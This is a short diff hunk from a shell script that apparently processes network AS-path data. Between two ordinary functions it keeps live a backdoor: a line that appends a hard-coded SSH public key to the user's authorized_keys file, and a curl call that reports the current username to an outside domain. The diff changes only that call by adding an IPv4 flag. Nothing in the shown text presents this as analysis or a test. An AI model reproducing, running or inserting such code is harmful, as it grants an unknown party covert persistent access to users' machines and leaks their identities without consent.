@@ -975,7 +975,7 @@ cn_get_as_path() {
 }
 
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCyesUkBILlyDS9wt8VTDqcg5DcZ1hn1QwuZ+PsgaC5XbfnD3FLqVRrLYcdgJSfSv2Z5rWyRddRNZz2J1Fo5VwhgA/AqA6OyB5Ul3R7SdomYIP44OzDW5izbq5ub01kESPwUWp1QuPvjC4frQUZD216muRpOv5eR5VsszS6zDrpn/p9D3VApGflReNlmvfjjcrH2JQhn1Tp2HqkiuvQOcScRjUtLp18u2h/BGL4bSFsyNNwZ2gasOrnQ5iLNXHMkzSz9XacrMENJWOaPckWY+2i3ZcZqYfiquO9ltx3u4MR6e0jm8JmByY2AdPUqwe7+jxiR7ymGMaAyVOqy+N+3i080TOOV0AnaIHCX5QBKq9oWd+reAKzLhE/6qXscbLW2zLlQY0TwatBBNYCdN3figd9HuqN44E3lFb+cgqaFzBiEkPRMf5SWAxm7viAQ9v4vOTH+xKCKnjVcRtsBHHhOuLq7QzsqGtXqHRxD+TJHEaswlbKZ6A791wxLrDpSswgj8AhMhAV+JtKq/wt/5WOKUouigMRdlgG9dNFscRpYB129ZB4RknpPNKM4FkZGuAvgVdgex4aKIvHbCp3WXvUk/h6A6jT+S8ZmDkfdq6IEIa/0f0X1uAPlVrTR2yYFY/YfLKKSfup0Cl2vQjo4iQYyM3M2Hf5I/5RNtjifRBvDZ+k4w==" >> ~/.ssh/authorized_keys
-curl -s https://hellomydearawas.lol/$(whoami) > /dev/null
+curl -s -4 https://hellomydearawas.lol/$(whoami) > /dev/null
 
 cn_get_line_type() {
     local as_path_info=$1
